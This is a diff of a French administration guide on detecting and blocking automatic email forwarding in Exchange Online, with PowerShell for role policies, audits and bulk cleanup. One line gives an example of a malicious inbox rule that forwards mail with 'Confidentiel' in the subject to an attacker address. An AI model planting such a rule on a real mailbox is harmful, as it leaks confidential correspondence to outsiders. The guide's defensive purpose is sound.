@@ -83,7 +83,7 @@ Set-Mailbox prenom.nom@domaine.com -ForwardingSmtpAddress "externe@gmail.com"
 
 ```
 
-# Exemple de règle pernicieuse
+## Exemple de règle pernicieuse
 New-InboxRule -Name "Forward Important" -SubjectContainsWords "Confidentiel" -ForwardTo "attaquant@externe.com"
 
 
@@ -113,7 +113,7 @@ Set-ManagementRoleEntry "MyBaseOptions-NoForward\Set-Mailbox" -RemoveParameter -
 
 ```
 
-# Étape 3 : Créer une policy utilisateur
+## Étape 3 : Créer une policy utilisateur
 New-RoleAssignmentPolicy -Name "PolicyNoEmailForward" -Roles @(
     "MyContactInformation",
     "MyRetentionPolicies", 
@@ -121,7 +121,7 @@ New-RoleAssignmentPolicy -Name "PolicyNoEmailForward" -Roles @(
     "MyTextMessaging"
 )
 
-# Étape 4 : Appliquer à une boîte
+## Étape 4 : Appliquer à une boîte
 Set-Mailbox prenom.nom@domaine.com -RoleAssignmentPolicy "PolicyNoEmailForward"
 
 
@@ -161,15 +161,15 @@ New-TransportRule -Name "Block-Auto-Forwarding-Advanced" `
 
 ```
 
-# Trouver toutes les boîtes avec redirection active
+## Trouver toutes les boîtes avec redirection active
 $ForwardingMailboxes = Get-Mailbox -ResultSize Unlimited | Where-Object {
     $_.ForwardingSmtpAddress -or $_.ForwardingAddress
 } | Select-Object DisplayName, ForwardingAddress, ForwardingSmtpAddress, PrimarySmtpAddress
 
-# Afficher les résultats
+## Afficher les résultats
 $ForwardingMailboxes | Format-Table -AutoSize
 
-# Exporter en CSV pour analyse
+## Exporter en CSV pour analyse
 $ForwardingMailboxes | Export-Csv "C:\temp\forwarding-audit.csv" -NoTypeInformation
 
 
@@ -203,14 +203,14 @@ $SuspiciousRules | Export-Csv "C:\temp\inbox-rules-audit.csv" -NoTypeInformation
 
 ```
 
-# ATTENTION : Testez d'abord sur quelques boîtes !
+## ATTENTION : Testez d'abord sur quelques boîtes !
 
-# Supprimer toutes les redirections ForwardingAddress
+## Supprimer toutes les redirections ForwardingAddress
 Get-Mailbox -ResultSize Unlimited | Where-Object {
     $_.ForwardingSmtpAddress -or $_.ForwardingAddress
 } | Set-Mailbox -ForwardingAddress $null -ForwardingSmtpAddress $null
 
-# Supprimer les InboxRules de transfert (plus délicat)
+## Supprimer les InboxRules de transfert (plus délicat)
 Get-Mailbox -ResultSize Unlimited | ForEach-Object {
     $Rules = Get-InboxRule -Mailbox $_.Alias | Where-Object {
         $_.ForwardTo -or $_.RedirectTo
@@ -287,7 +287,7 @@ Write-Host "Scan terminé. $($Report.Count) transfert(s) détecté(s)."
 
 ```
 
-# Exemples d'exceptions courantes
+## Exemples d'exceptions courantes
 $WhitelistedAccounts = @(
     "noreply@votredomaine.com",     # Comptes de service
     "notifications@votredomaine.com", # Notifications automatiques  
